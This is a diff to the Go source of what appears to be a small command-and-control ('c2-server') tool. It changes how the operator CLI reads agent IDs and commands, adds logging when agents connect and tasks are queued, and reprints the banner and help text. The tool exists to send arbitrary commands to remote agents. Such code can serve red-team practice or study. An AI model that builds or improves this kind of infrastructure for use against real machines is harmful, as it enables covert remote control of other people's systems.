@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"c2-server/models"
 	"encoding/json"
 	"fmt"
@@ -41,6 +42,7 @@ func beaconHandler(w http.ResponseWriter, r *http.Request) {
 			Hostname: req.Hostname,
 		}
 		agents[req.ID] = agent
+		fmt.Printf("Agent %s with hostname %s connected\n", agent.ID, agent.Hostname)
 	}
 	agent.LastSeen = time.Now()
 
@@ -117,18 +119,22 @@ func sendTask(w http.ResponseWriter, a *models.Agent) {
 }
 
 func addTask() {
+	reader := bufio.NewReader(os.Stdin)
 	fmt.Print("id -> ")
 	var id string
-	fmt.Scanln(&id)
+	id, _ = reader.ReadString('\n')
+	id = strings.TrimSpace(id)
 	fmt.Print("command -> ")
 	var command string
-	fmt.Scanln(&command)
+	command, _ = reader.ReadString('\n')
+	command = strings.TrimSpace(command)
 	agent, exists := agents[id]
 	if !exists {
 		agent = &models.Agent{ID: id, LastSeen: time.Now()}
 		agents[id] = agent
 	}
 	agent.Tasks = append(agent.Tasks, command)
+	fmt.Printf("Task %s added for agent %s\n", command, id)
 }
 
 func printBanner() {
@@ -176,14 +182,16 @@ func cli() {
 		fmt.Print("c2> ")
 		var cmd string
 		fmt.Scanln(&cmd)
-		printBanner()
 		switch cmd {
 		case "help":
 			flushTerminal()
+			printBanner()
 			printHelp()
 		case "agents":
 			flushTerminal()
 			mu.Lock()
+			printBanner()
+			printHelp()
 			fmt.Println("Agents:")
 			for _, a := range agents {
 				fmt.Printf(" - ID: %s Hostname: %s  last seen: %s\n", a.ID, a.Hostname, a.LastSeen.Format(time.RFC822))
@@ -192,6 +200,8 @@ func cli() {
 		case "tasks":
 			flushTerminal()
 			mu.Lock()
+			printBanner()
+			printHelp()
 			fmt.Println("Queued tasks:")
 			for id, agent := range agents {
 				if len(agent.Tasks) > 0 {
@@ -204,6 +214,8 @@ func cli() {
 		case "add":
 			flushTerminal()
 			mu.Lock()
+			printBanner()
+			printHelp()
 			addTask()
 			mu.Unlock()
 		case "exit":
@@ -211,6 +223,8 @@ func cli() {
 			fmt.Println("Shutting down...")
 			os.Exit(0)
 		case "":
+			printBanner()
+			printHelp()
 			continue
 		default:
 			fmt.Println("Unknown command. Type 'help'.")
